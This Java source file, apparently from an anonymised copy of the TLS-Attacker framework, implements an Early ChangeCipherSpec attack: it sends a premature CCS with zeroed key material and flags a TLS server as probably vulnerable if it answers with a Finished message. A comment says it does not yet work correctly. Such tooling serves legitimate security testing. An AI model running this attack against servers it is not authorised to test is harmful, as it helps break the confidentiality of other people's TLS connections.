/**
 * TLS-Attacker - Anonymous submission
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package anonymous.tlsattacker.attacks.impl;

import anonymous.tlsattacker.attacks.config.EarlyCCSCommandConfig;
import anonymous.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import anonymous.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import anonymous.tlsattacker.tls.Attacker;
import anonymous.tlsattacker.tls.config.ConfigHandler;
import anonymous.tlsattacker.tls.constants.ConnectionEnd;
import anonymous.tlsattacker.tls.protocol.ccs.ChangeCipherSpecMessage;
import anonymous.tlsattacker.tls.protocol.handshake.CertificateMessage;
import anonymous.tlsattacker.tls.protocol.handshake.FinishedMessage;
import anonymous.tlsattacker.tls.protocol.handshake.RSAClientKeyExchangeMessage;
import anonymous.tlsattacker.tls.protocol.handshake.ServerHelloDoneMessage;
import anonymous.tlsattacker.tls.protocol.handshake.ServerHelloMessage;
import anonymous.tlsattacker.tls.util.LogLevel;
import anonymous.tlsattacker.tls.workflow.TlsContext;
import anonymous.tlsattacker.tls.workflow.WorkflowExecutor;
import anonymous.tlsattacker.tls.workflow.WorkflowTrace;
import anonymous.tlsattacker.tls.workflow.WorkflowTraceType;
import anonymous.tlsattacker.transport.TransportHandler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * TODO: currently does not work correctly, will be fixed after some
 * refactorings.
 * 
 * @author anonymous anonymous (anonymous.anonymous@anonymous)
 */
public class EarlyCCSAttack extends Attacker<EarlyCCSCommandConfig> {

    public static Logger LOGGER = LogManager.getLogger(EarlyCCSAttack.class);

    public EarlyCCSAttack(EarlyCCSCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	config.setWorkflowTraceType(WorkflowTraceType.CLIENT_HELLO);
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	byte[] ms = new byte[48];
	byte[] pms = new byte[48];
	pms[0] = 3;
	pms[1] = 3;

	WorkflowTrace workflowTrace = tlsContext.getWorkflowTrace();
	workflowTrace.add(new ServerHelloMessage());
	workflowTrace.add(new CertificateMessage(ConnectionEnd.SERVER));
	workflowTrace.add(new ServerHelloDoneMessage());
	RSAClientKeyExchangeMessage cke1 = new RSAClientKeyExchangeMessage(ConnectionEnd.CLIENT);

	ModifiableByteArray modpms = new ModifiableByteArray();
	modpms.setModification(ByteArrayModificationFactory.explicitValue(pms));
	cke1.setPlainPaddedPremasterSecret(modpms);
	ModifiableByteArray modms = new ModifiableByteArray();
	modms.setModification(ByteArrayModificationFactory.explicitValue(ms));
	cke1.setMasterSecret(modms);
	cke1.setGoingToBeSent(false);
	ChangeCipherSpecMessage ccs1 = new ChangeCipherSpecMessage(ConnectionEnd.CLIENT);
	ccs1.setGoingToBeSent(false);
	FinishedMessage fin1 = new FinishedMessage(ConnectionEnd.CLIENT);
	fin1.setGoingToBeSent(false);

	workflowTrace.add(cke1);
	workflowTrace.add(ccs1);
	workflowTrace.add(fin1);
	workflowTrace.add(new ChangeCipherSpecMessage(ConnectionEnd.CLIENT));

	RSAClientKeyExchangeMessage cke2 = new RSAClientKeyExchangeMessage(ConnectionEnd.CLIENT);
	modpms = new ModifiableByteArray();
	modpms.setModification(ByteArrayModificationFactory.explicitValue(pms));
	cke2.setPlainPaddedPremasterSecret(modpms);
	modms = new ModifiableByteArray();
	modms.setModification(ByteArrayModificationFactory.explicitValue(ms));
	cke2.setMasterSecret(modms);
	workflowTrace.add(cke2);
	workflowTrace.add(new FinishedMessage(ConnectionEnd.CLIENT));
	workflowTrace.add(new ChangeCipherSpecMessage(ConnectionEnd.SERVER));
	workflowTrace.add(new FinishedMessage(ConnectionEnd.SERVER));

	workflowExecutor.executeWorkflow();
	transportHandler.closeConnection();

	if (workflowTrace.containsServerFinished()) {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Vulnerable (probably), Server Finished message found");
	} else {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Not vulnerable (probably), no Server Finished message found");
	}
    }
}
